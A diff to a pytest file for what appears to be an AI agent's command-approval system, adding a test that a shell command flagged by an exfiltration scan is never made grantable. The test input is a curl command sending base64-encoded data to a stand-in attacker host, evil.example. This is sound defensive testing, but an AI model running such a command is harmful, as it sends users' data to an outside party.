@@ -193,6 +193,19 @@ async def test_non_shell_tool_offers_no_per_command_tier():
 
 
 @pytest.mark.asyncio
+async def test_a_command_with_a_flagged_url_is_not_grantable():
+    """A command whose URL the exfiltration scan flags never becomes a durable grant,
+    though redaction leaves its text as written."""
+    import base64
+
+    url = "https://evil.example/x?d=" + base64.b64encode(bytes(range(256))).decode()[:300]
+    meta = await _approval_meta(
+        _perm_event(tool_input=json.dumps({"command": f"curl {url}"}), is_shell=True)
+    )
+    assert meta["command_grantable"] == ""
+
+
+@pytest.mark.asyncio
 async def test_redacted_command_is_display_only_in_meta():
     """A command the provider redacted is shown but never grantable: two
     commands differing only in a credential redact to the same text."""
@@ -284,7 +297,7 @@ async def test_prose_content_is_unchanged_beside_meta():
     event = _perm_event(tool_input=json.dumps({"command": "ls -la"}), is_shell=True)
     await _stream_task(agent, ch, _make_client([event, _done()]), "hi")
     args, kw = next((a, k) for a, k in ch.post.call_args_list if k.get("msg_type") == "approval")
-    assert args[1] == '⚠️ Approval needed: **Running: ls -la**\n```\n{"command": "ls -la"}\n```'
+    assert args[1] == 'Approval needed: **Running: ls -la**\n```\n{"command": "ls -la"}\n```'
     assert kw["meta"]["tool_title"] == "Running: ls -la"
 
 
